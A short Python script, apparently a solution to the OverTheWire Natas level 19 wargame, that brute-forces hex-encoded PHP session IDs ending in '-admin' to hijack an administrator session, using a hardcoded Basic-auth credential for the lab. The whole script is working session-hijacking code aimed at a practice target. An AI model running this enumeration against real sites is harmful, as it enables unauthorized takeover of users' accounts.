import requests
import string
import base64
import itertools
import time

def find_password():
    auth_key = "Basic " + base64.b64encode(b"natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs").decode("utf-8")
    for num in range(0, 640):
        sess_id = "".join("{:02x}".format(ord(c)) for c in str(num) + "-admin")
        result = requests.post("http://natas19.natas.labs.overthewire.org", 
                headers={"Authorization": auth_key, "Cookie": "PHPSESSID=" + sess_id}, 
                data={"username": "abc", "password": "abc"})
        if "Username:" in result.text:
            return str(sess_id) + " " + result.text
        time.sleep(1)

print(find_password())
import itertools
